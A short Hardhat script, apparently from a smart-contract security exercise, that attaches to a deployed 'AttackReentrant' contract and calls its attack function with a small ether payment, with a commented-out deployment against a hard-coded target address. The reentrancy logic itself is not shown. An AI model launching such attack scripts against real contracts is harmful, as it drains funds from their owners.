
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
  let provider = ethers.provider;
  const reentrant = await hre.ethers.getContractFactory("AttackReentrant");
  // const attack = await reentrant.deploy("0x84506d5EA7e732Ff4FdC97B761966F36707E1e29", { value: ethers.utils.parseEther("0.0011")});
  const attack = await reentrant.attach("0xF526302b118310fFd834E3F20B915640aED982Fb");

  await attack.deployed();

  console.log("attack deployed to:", attack.address);

  await attack.attack(1000000000000000, {value: ethers.utils.parseEther("0.001")});
}


main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
